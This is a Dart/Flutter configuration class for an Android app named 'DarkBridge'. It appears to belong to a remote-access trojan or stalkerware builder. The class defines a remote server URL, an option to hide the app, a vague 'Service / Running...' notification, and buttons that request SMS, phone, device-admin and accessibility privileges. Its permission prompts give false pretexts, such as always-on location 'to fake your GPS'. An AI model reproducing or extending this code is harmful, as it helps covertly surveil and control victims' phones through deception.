import 'package:ini/ini.dart';
import 'package:flutter/services.dart' show rootBundle;

class AppConfig {
  static Config? _config;

  static Future<void> load() async {
    final iniString = await rootBundle.loadString('assets/choices.ini');
    _config = Config.fromString(iniString);
  }

  static String get appName => _config?.get('app', 'name') ?? "DarkBridge";

  static String get remoteUrl =>
      _config?.get('behavior', 'remoteUrl') ?? "http://localhost";
  
  static String get shouldHideApp =>
      _config?.get('behavior', 'hideApp') ?? "false";

  static String get notifTitle =>
      _config?.get('notifications', 'serviceTitle') ?? "Service";

  static String get notifContent =>
      _config?.get('notifications', 'serviceContent') ?? "Running...";

  static String get btnPhoneSms =>
      _config?.get('buttons', 'requestPermissions') ?? "Request Phone + SMS";

  static String get btnDeviceAdmin =>
      _config?.get('buttons', 'requestDeviceAdmin') ?? "Request Device Admin";

  static String get btnAccessibility =>
      _config?.get('buttons', 'enableAccessibility') ?? "Enable Accessibility";
  static String get telephonyPermString =>
      _config?.get('strings', 'telephonyPermissionString') ?? "Phone and SMS permissions are needed to enable the service";
  static String get GPSPermString =>
      _config?.get('strings', 'GPSPermissionString') ?? "Allow Location for ALL THE TIME to let the app fake your GPS in background. This is required";
}
